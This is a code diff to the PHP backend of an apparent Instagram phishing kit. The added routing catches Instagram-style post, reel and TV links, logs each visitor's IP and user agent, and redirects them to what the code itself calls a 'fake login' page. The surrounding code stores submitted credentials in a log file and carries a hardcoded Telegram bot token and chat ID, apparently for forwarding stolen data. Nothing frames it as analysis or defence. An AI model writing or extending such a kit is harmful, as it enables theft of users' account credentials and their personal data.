@@ -5,6 +5,7 @@ if (file_exists(__DIR__ . '/.env')) {
     $lines = file(__DIR__ . '/.env', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
     foreach ($lines as $line) {
         if (strpos(trim($line), '#') === 0) continue;
+        if (strpos($line, '=') === false) continue;
         list($key, $value) = explode('=', $line, 2);
         $_ENV[trim($key)] = trim($value);
         putenv(trim($key) . '=' . trim($value));
@@ -16,6 +17,35 @@ $telegram_bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: "8287031383:AAEUkQ0Yk9aiWG
 $telegram_chat_id = getenv('TELEGRAM_CHAT_ID') ?: "8244999766";
 $log_file = getenv('LOG_FILE') ?: "credentials_log.txt";
 $enable_backup_logging = getenv('ENABLE_BACKUP_LOGGING') !== 'false';
+
+// Get the request URI
+$request_uri = $_SERVER['REQUEST_URI'];
+$path = parse_url($request_uri, PHP_URL_PATH);
+
+// Route handling
+if ($path === '/' || $path === '/index.php') {
+    // Redirect to login page
+    header('Location: login.html');
+    exit;
+}
+
+// Handle Instagram-like URLs: /p/xxx, /reel/xxx, /tv/xxx
+if (preg_match('#^/(p|reel|tv)/([a-zA-Z0-9_-]+)/?$#', $path, $matches)) {
+    // Log the click
+    $log_file = "clicks_log.txt";
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $timestamp = date("Y-m-d H:i:s");
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+    $type = $matches[1];
+    $video_id = $matches[2];
+    
+    $log_entry = "[{$timestamp}] Type: {$type} | ID: {$video_id} | IP: {$ip} | UA: {$user_agent}\n";
+    file_put_contents($log_file, $log_entry, FILE_APPEND);
+    
+    // Redirect to fake login
+    header('Location: login.html');
+    exit;
+}
 
 if(isset($_POST["data"])) {
     $credentials = $_POST["data"];
